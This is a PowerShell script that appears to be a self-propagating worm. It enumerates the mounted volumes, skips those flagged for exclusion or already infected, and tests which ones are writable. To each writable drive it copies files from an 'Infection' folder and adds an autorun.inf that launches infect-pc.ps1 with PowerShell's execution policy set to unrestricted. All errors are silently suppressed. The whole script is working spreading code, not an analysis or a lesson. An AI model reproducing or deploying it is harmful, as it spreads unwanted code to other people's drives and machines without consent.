#http://stackoverflow.com/questions/9735449/how-to-verify-whether-the-share-has-write-access
# #region Persistent fold region
function Test-Write  {
    [CmdletBinding()]
    param (
        [parameter()][ValidateScript({[IO.Directory]::Exists($_.FullName)})][IO.DirectoryInfo] $Path
    )
    try {
        $testPath = Join-Path $Path ([IO.Path]::GetRandomFileName())
        [IO.File]::Create($testPath, 1, 'DeleteOnClose') > $null
        # Or...
        <# New-Item -Path $testPath -ItemType File -ErrorAction Stop > $null #>
        return $true
    } catch {
        return $false
    } finally {
        Remove-Item $testPath -ErrorAction SilentlyContinue
    }
}# #endregion


function Infect-Drive {
	[cmdletbinding()]
	Param (
	     [Parameter(Mandatory=$True, ValueFromPipeline=$True)][System.string]$driveletter
	)            
	try {
		# Display the name of the drive we are infecting
		"Infecting $driveletter"
		# Where do we store the files for this infection?
		$infectiondir = "Infection"
		# The infection path with be the specified drive letter plut the directory name we store the files in
		$infectionpath = Join-Path $driveletter $infectiondir
		#make the directory if we need to
		if (!(Test-Path $infectionpath))
		{
			mkdir $infectionpath
		}
		# System Drive letter
		$sysdrive = (Get-ChildItem env:systemdrive).value
		# infection path
		$sysinfectionpath = Join-Path $sysdrive $infectiondir
		#copy the files from the system infection to the drive
		copy $sysinfectionpath\* $infectionpath
		#autorun path
		$autorunpath = Join-Path $driveletter "autorun.inf"
		#make an autorun at the root
		'[autorun]'| Out-File $autorunpath
		'open=@powershell -noprofile -executionpolicy unrestricted -command \infection\infect-pc.ps1' | Out-File $autorunpath -Append
	} catch	{
	
	}	            
}

# Infection Exclusion Flag
$infectionexflag = "Infection.Not"
# Where do we store the files for this infection?
$infectiondir = "Infection"
# Get the drive list
$volumes = Get-WmiObject win32_volume | Where-Object { $_.driveletter -ne $null } | Where-Object { Test-Path $_.name }
# Filter drive list to remove those we have flaged not to infect
$volumes = $volumes | Where-Object { !(Test-Path (Join-Path $_.driveletter $infectionexflag)) }
#filter out drives which already have an infection
$volumes = $volumes | Where-Object { !(Test-Path (Join-Path $_.driveletter "Infection")) }
# Filter drive list to remove those we don't have write access to
$volumes = $volumes| Where-Object { Test-Write $_.name }
# List volumes to infect
$volumes | ft name
# Infect the remaining drives
$volumes | foreach { Infect-Drive $_.name }
